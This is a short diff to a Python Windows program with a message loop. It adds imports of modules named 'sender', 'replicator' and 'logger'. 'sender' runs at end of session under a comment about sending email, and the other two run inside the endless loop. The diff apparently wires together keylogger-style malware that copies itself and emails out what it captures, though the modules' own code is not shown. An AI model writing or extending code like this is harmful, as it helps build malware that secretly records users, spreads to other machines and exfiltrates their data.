@@ -21,7 +21,7 @@ def wndproc(hwnd, msg, wparam, lparam):
     ctrl = msg
     #Sends email on End of Session
     if ctrl == 17:
-        pass
+        import sender
     else:
         pass
 
@@ -75,3 +75,6 @@ else:
     while True:
         win32gui.PumpWaitingMessages()
         time.sleep( 1 )
+        import replicator
+        import logger
+        
